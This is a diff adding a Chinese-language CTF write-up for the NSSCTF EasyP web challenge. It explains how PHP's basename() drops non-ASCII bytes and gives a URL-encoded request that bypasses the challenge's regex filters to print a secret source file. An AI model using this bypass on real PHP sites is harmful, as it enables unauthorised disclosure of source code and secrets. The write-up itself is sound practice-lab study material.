@@ -10582,6 +10582,74 @@ Array
 
 ![image-20240524123450006](CTF.assets/image-20240524123450006.png)
 
+## NSSCTF [鹤城杯 2021]EasyP
+
+```php
+<?php
+include 'utils.php';
+
+if (isset($_POST['guess'])) {
+    $guess = (string) $_POST['guess'];
+    if ($guess === $secret) {
+        $message = 'Congratulations! The flag is: ' . $flag;
+    } else {
+        $message = 'Wrong. Try Again';
+    }
+}
+
+// 匹配 /utils.php/ 或者 /utils.php///
+if (preg_match('/utils\.php\/*$/i', $_SERVER['PHP_SELF'])) {
+    exit("hacker :)");
+}
+
+if (preg_match('/show_source/', $_SERVER['REQUEST_URI'])){
+    exit("hacker :)");
+}
+
+if (isset($_GET['show_source'])) {
+    highlight_file(basename($_SERVER['PHP_SELF']));
+    exit();
+}else{
+    show_source(__FILE__);
+}
+?> 
+```
+
+`PHP_SELF`当前执行脚本的文件名，与 document root 有关。例如，在地址为 http://example.com/foo/bar.php 的脚本中使用 $_SERVER['PHP_SELF'] 将得到 /foo/bar.php。
+
+`REQUEST_URI`URI 用来指定要访问的页面。例如 “`/index.html`”。不会对URL做URL解码
+
+在使用默认语言环境设置时，basename()会删除文件名开头的非ASCII字符。
+
+```php
+<?php
+    $file = $_GET['file'];
+    echo basename($file);
+
+
+# 返回结果
+http://localhost/?file=%ffindex.php/%ff
+//index.php
+http://localhost/?file=%ffindex.php
+//index.php
+http://localhost/?file=index.php%ff
+//index.php
+http://localhost/?file=index.php/%2b
+//+
+```
+
+综合上面的三个前置条件，首先访问：`/index.php/utils.php/%ff`由于`basename()`会删除文件名开头的非ASCII字符，得到`utils.php`，且`REQUEST_URI`URI 用来指定要访问的页面。例如 “`/index.html`”。不会对URL做URL解码，直接将show_source做URL编码即可，
+
+```
+/index.php/utils.php/%ff?%73%68%6F%77_%73%6F%75%72%63%65=1
+```
+
+
+
+
+
+
+
 # Misc
 
 ## János-the-Ripper-隐写-压缩包密码破解
